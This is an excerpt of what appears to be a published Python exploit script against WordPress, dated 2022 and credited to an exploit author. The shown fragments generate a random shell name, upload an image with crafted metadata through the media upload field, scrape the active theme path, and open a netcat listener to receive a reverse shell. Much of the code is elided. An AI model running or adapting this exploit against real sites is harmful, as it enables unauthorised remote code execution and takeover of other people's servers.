...
# Date: 2022-10-27
# Exploit Author: Bryan Muñoz (0xR3gx)
...
shell_name = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8))
imagename = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8))
imagename += ".jpg"
...
def upload_image():
    ...
    image = {
            'async-upload':(imagename, meta_img)
            }
...
def get_current_theme():
    r = s.get(f"{url}")
    theme = re.findall('\/wp-content\/themes\/(.+?)\/', r.text)[0]
...
def nc_listener():
    ...
    listener = subprocess.run(['nc', '-lnp', f'{lport}'], stderr=subprocess.PIPE)
